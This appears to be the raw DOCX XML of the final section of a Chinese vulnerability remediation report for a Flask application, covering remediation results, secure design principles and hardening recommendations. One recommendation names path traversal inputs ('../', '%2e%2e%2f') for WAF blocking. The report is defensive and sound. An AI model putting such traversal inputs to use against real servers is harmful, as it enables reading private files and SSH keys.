                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击链有效步骤</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>7/7 可执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0/7 可执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>10.2 核心设计原则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>本次修复遵循安全开发最佳实践：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原则</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实施方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>涉及漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单 &gt; 黑名单</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>仅允许预设页面名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1/2/3/4/5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>纵深防御</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单 + realpath + bleach 三重防护</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1/3/4/6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>最小权限</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>输入不信任、文件名不保留</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 8/9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>输出编码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>后端清洗 + 前端自动转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>防御分层</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>认证层 + 校验层 + 输出层</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 7/1/6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>10.3 持续改进建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>非 root 运行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：建议使用非特权用户运行 Flask 进程，降低 SSH 私钥泄露风险</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>HTTPS 部署</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：在生产环境配置 TLS 证书，防止中间人攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>WAF 规则</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：添加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>%2e%2e%2f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等路径穿越特征的拦截规则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>日志监控</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：对异常的 404 路径请求进行告警（高频目录穿越请求）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>密钥轮换</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：定期更新 SSH 密钥对，缩短泄露影响窗口</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12"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